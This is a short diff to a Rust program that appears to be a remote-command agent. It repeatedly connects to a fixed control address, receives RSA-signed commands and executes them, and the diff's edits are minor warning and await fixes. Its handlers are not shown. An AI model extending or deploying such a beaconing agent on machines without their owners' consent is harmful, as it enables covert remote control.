@@ -1,7 +1,7 @@
 use directories::UserDirs;
 use rsa::pkcs1::DecodeRsaPublicKey;
 use rsa::pkcs1v15::{Signature, VerifyingKey};
-use rsa::sha2::{Digest, Sha256};
+use rsa::sha2::Sha256;
 use rsa::signature::Verifier;
 use rsa::RsaPublicKey;
 use std::env;
@@ -40,7 +40,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
         let mut stream = get_stream().await;
         let (mut reader, mut writer) = stream.split();
         if let Err(_) = writer.write_all(b"Hello!").await {
-            writer.shutdown().await;
+            let _ = writer.shutdown().await;
             continue;
         }
 
@@ -51,7 +51,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
         let message_length = match reader.read_exact(&mut buf).await {
             Ok(n) => n,
             Err(_) => {
-                writer.shutdown().await;
+                let _ = writer.shutdown().await;
                 continue;
             }
         };
@@ -61,7 +61,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
         let mut signature_buf = vec![0u8; 256];
 
         if let Err(_) = reader.read(&mut signature_buf).await {
-            writer.shutdown().await;
+            let _ = writer.shutdown().await;
         }
 
         let signature =
@@ -89,7 +89,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
 
         handle_command(&command).await;
 
-        writer.shutdown().await;
+        let _ = writer.shutdown().await;
     }
 }
 
@@ -98,7 +98,7 @@ async fn get_stream() -> TcpStream {
         match TcpStream::connect(CONTROL).await {
             Ok(s) => return s,
             Err(_) => {
-                sleep(Duration::from_millis(5000));
+                sleep(Duration::from_millis(5000)).await;
             }
         }
     }
